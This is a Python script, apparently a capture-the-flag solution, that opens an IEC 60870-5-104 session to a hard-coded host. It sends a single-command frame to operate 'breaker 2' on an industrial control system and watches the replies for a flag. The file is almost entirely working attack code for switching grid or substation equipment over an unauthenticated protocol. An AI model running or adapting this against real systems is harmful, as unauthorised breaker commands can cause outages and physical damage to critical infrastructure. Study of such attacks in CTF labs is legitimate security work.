#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

class IEC104:
    def __init__(self, host, port):
        self.s = socket.socket()
        self.s.settimeout(10)
        self.s.connect((host, port))
        self.tx = 0
        self.rx = 0
    
    def send_raw(self, data):
        self.s.send(data)
    
    def recv(self, timeout=5):
        self.s.settimeout(timeout)
        data = b''
        try:
            while True:
                try:
                    chunk = self.s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(chunk) < 4096:
                        break
                except socket.timeout:
                    break
        except:
            pass
        return data
    
    def startdt_act(self):
        self.send_raw(bytes([0x68,0x04,0x07,0x00,0x00,0x00]))
        return self.recv(3)
    
    def testfr_act(self):
        self.send_raw(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
        return self.recv(3)
    
    def send_i(self, asdu):
        c1 = (self.tx << 1) & 0xFE
        c2 = (self.tx >> 7) & 0xFF
        c3 = (self.rx << 1) & 0xFE
        c4 = (self.rx >> 7) & 0xFF
        f = bytes([0x68, 4+len(asdu), c1, c2, c3, c4]) + asdu
        self.send_raw(f)
        self.tx += 1
        return self.recv(5)
    
    def send_s(self):
        c3 = (self.rx << 1) & 0xFE
        c4 = (self.rx >> 7) & 0xFF
        self.send_raw(bytes([0x68,0x04,0x01,0x00,c3,c4]))
        return self.recv(2)

def main():
    c = IEC104(HOST, PORT)
    r = c.startdt_act()
    print('START:', r.hex())
    
    # Send command to breaker 2 (critical?)
    asdu = bytes([45, 0x01, 0x06, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x01])
    r = c.send_i(asdu)
    print('CMD:', r.hex())
    if b'CTF{' in r:
        print(r)
        return
    
    # Keep alive
    for i in range(40):
        try:
            r = c.recv(5)
            if r:
                print('R:', r.hex())
                if b'CTF{' in r:
                    print(r)
                    return
            c.send_s()
            time.sleep(3)
        except Exception as e:
            print(e)
            break
    
    c.s.close()

if __name__ == '__main__':
    main()
